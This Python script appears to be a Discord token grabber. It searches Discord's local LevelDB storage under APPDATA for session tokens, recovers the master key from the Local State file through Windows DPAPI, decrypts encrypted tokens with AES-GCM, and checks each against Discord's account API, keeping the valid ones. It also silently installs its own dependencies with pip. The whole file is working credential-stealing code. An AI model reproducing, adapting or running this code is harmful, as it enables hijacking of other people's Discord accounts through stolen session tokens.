import re
import os
import base64
import json
import pip

try:
    import requests
except:
    pip.main(['install', 'requests'])
    import requests

try:
    import win32crypt
except:
    pip.main(['install', 'pypiwin32 '])
    pip.main(['install', 'pywin32'])
    import win32crypt

try:
    from Crypto.Cipher import AES
except:
    pip.main(['install', 'pycryptodome'])
    from Crypto.Cipher import AES


def getToken(name, path):
    tokens = []
    bc_id = []
    roaming = os.getenv('APPDATA')
    baseurl = 'https://discordapp.com/api/v6/users/@me'
    regex = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    # encrypted_regex = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    encrypted_regex = r'\"(dQw4w9WgXcQ:.*?)\"'

    try:
        if not os.path.exists(path):
            return
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            print(os.path.exists(roaming + f'\\{disc}\\Local State'))
            print(os.listdir(path))
            if os.path.exists(roaming + f'\\{disc}\\Local State'):
                print(os.listdir(path))
                for filname in os.listdir(path):
                    print(filname[-3:] not in ["log", "ldb"])
                    if filname[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(encrypted_regex, line):
                            print("Unencrypted key", y)
                            try:
                                print("Master Key", get_master_key(
                                    roaming + f'\\{disc}\\Local State'))
                                print("Base64Decoded", base64.b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]))

                                token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                    1]), get_master_key(roaming + f'\\{disc}\\Local State'))
                            except ValueError:
                                pass
                            try:
                                r = requests.get(baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in bc_id:
                                    tokens.append(token)
                                    bc_id.append(uid)
        else:
            for filname in os.listdir(path):
                if filname[-3:] not in ["log", "ldb"]:
                    continue
                for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regex, line):
                        try:
                            r = requests.get(baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                        except Exception:
                            pass
                        if r.status_code == 200:
                            uid = r.json()['id']
                            if uid not in bc_id:
                                tokens.append(token)
                                bc_id.append(uid)
        print(tokens)
        return tokens
    except:
        pass


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(
        master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


#getToken("Discord", os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb')
